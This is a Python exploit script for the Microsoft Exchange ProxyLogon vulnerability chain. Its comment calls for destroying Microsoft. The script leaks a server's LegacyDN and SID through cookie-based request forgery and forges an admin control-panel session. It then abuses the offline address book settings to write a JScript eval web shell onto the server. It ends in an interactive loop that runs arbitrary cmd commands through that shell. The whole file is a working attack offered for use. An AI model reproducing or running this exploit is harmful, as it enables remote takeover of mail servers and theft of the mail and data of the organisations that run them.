import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys
import os
import time
import webbrowser
#write by jang aka tesanull
#destroy microsoft if you can, but i want too
def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if len(sys.argv) < 2:
	print("Usage: python3 %s <target> <email>"%sys.argv[0])
	print("Example: python3 %s mail.evil.corp root@evil.corp"%sys.argv[0])
	exit()
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
target = sys.argv[1]
email = sys.argv[2]
shell_name = "evilcorp.aspx"
random_name = id_generator(3) + ".js"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s" % shell_name
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'

autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % email

print("Attacking target " + target)
print("=============================")

FQDN = "EXCHANGE"
ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                        "User-Agent": user_agent},
                  verify=False)
if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "User-Agent": user_agent},
                   data=autoDiscoverBody,
                   verify=False
                   )
if ct.status_code != 200:
    print("Autodiscover Error!")
    exit()
if "<LegacyDN>" not in ct.text:
    print("Can not get LegacyDN!")
    exit()

legacyDn = ct.text.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
mailboxid = ct.text.split('<Server>')[1].split('</Server>')[0]
print("Got DN: " + legacyDn)

mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;" % (FQDN, mailboxid),
    "Content-Type": "application/mapi-http",
    "X-Requesttype": "Connect",
    "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
    "X-Clientapplication": "Outlook/15.0.4815.1002",
    "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:500",
    "User-Agent": user_agent
},
                   data=mapi_body,
                   verify=False
                   )
if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.text:
    print("Mapi Error!")
    exit()

sid = ct.text.split("with SID ")[1].split(" and MasterAccountSid")[0]

print("Got SID: " + sid)

proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
""" % sid

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent
},
                   data=proxyLogon_request,
                   verify=False
                   )
if ct.status_code != 241 or not "msExchEcpCanary" in ct.headers["Set-Cookie"]::
    print("Proxylogon Error!")
    exit()

sess_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]

msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
print("Got session id: " + sess_id)
print("Got canary: " + msExchEcpCanary)

ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, sess_id, msExchEcpCanary),
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent
},
                  verify=False
                  )
if ct.status_code != 200:
    print("Wrong canary!")
    print("Sometime we can skip this ...")

print("=========== It means good to go!!!====")

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent

},
                   json={"filter": {
                       "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                      "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                   verify=False
                   )
if ct.status_code != 200:
    print("GetOAB Error!")
    exit()
oabId = ct.text.split('"RawIdentity":"')[1].split('"')[0]
print("Got OAB id: " + oabId)

oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "ExternalUrl": "http://ffff/#%s" % shell_content}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent
},
                   json=oab_json,
                   verify=False
                   )
if ct.status_code != 200:
    print("Set external url Error!")
    exit()

reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                  "properties": {
                      "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                     "FilePathName": shell_absolute_path}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent
},
                   json=reset_oab_body,
                   verify=False
                   )

if ct.status_code != 200:
    print("Write Shell Error!")
    exit()
print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
print('(+) Enjoy your shell: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
time.sleep(2)
while True:
	cmd = input('CMD: ')
	shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())'''%cmd
	shell_req = requests.post('https://%s/owa/auth/%s'%(target, shell_name),headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user_agent},data=shell_body_exec,verify=False)
	print(shell_req.text.split('Name                            :')[0])

